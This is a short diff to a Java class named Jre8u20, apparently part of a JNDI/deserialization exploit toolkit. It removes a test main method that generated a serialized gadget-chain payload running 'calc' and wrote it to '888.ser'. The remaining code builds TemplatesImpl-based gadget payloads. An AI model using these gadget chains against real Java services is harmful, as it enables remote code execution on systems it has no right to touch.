@@ -8,7 +8,6 @@ import com.nu1r.jndi.gadgets.utils.Util;
 import javax.xml.transform.Templates;
 import java.beans.beancontext.BeanContextSupport;
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
@@ -16,12 +15,6 @@ import java.util.HashMap;
 import java.util.LinkedHashSet;
 
 public class Jre8u20 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("888.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object templates       = Gadgets.createTemplatesImpl(type, param);
